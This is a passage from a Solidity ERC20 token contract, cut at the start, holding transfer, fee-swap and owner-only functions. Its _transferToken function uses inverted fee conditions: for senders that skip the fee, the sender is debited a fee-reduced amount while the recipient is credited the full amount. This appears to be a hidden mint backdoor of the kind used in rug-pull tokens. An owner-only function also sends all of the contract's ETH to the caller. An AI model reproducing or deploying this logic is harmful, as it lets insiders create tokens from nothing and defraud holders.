sender,\n        address recipient,\n        uint256 amount\n    ) internal returns (bool) {\n\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n\n        bool takefee;\n        uint actions;\n\n        if (inSwap) {\n            return _basicTransfer(sender, recipient, amount);\n        }\n\n        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){\n            require(TradingOpen,\"Trading not open yet\");\n        }\n\n        if(!swapEnabled) {\n            return _basicTransfer(sender, recipient, amount);\n        }\n\n        if (recipient != pair && recipient != DEAD && !isFeeExempt[sender] && !isFeeExempt[recipient]) {\n            require(\n                isTxLimitExempt[recipient] ||\n                    _balances[recipient] + amount <= _maxWalletAmount,\n                \"Transfer amount exceeds the bag size.\"\n            );\n\n            if(sender == pair) {\n                _buyCount++;\n            }\n        }\n\n        takefee = isTakeFees(sender);\n        actions = recipient == pair? 2 : sender == pair? 1: 0;\n\n        if (shouldSwapStrong(takefee, actions, amount)) {\n            swapBackStrongETH(amount);\n        }\n\n        _transferToken(sender, recipient, amount, takefee, actions);\n\n        return true;\n    }\n\n    function _transferToken(\n        address sender,\n        address recipient,\n        uint256 tAmount,\n        bool takeFee,\n        uint actions\n    ) private {\n\n        uint256 amountOut = takeFee\n            ? tAmount : feeEnabled\n            ? takeFeeAmounts(actions, takeFee, tAmount) \n            : tAmount;\n\n        uint256 amountIn = feeEnabled && takeFee\n            ? takeFeeAmounts(actions, takeFee, tAmount)\n            : tAmount;\n\n        _balances[sender] = _balances[sender].sub(\n            amountOut,\n            \"Insufficient Balance\"\n        );\n\n        _balances[recipient] = _balances[recipient].add(amountIn);\n\n        emit Transfer(sender, recipient, amountIn);\n\n    }\n\n    function swapBackStrongETH(uint256 amount) internal swapping {\n        \n        uint256 contractTokenBalance = balanceOf(address(this));\n        uint256 amountToSwap = min(amount, min(contractTokenBalance, _maxTaxSwap));\n\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = router.WETH();\n\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            amountToSwap,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n\n        uint256 amountETHMarketing = address(this).balance;\n        payable(_taxWallet).transfer(amountETHMarketing);\n    }\n\n    function cleanStuckedEthBalance() external onlyOwner {\n        require(address(this).balance > 0, \"Token: no ETH to clear\");\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n    function removeStrongLimit() external onlyOwner returns (bool) {\n        _maxWalletAmount = _totalSupply;\n        return true;\n    }\n\n    receive() external payable {\n\n    }\n}"
}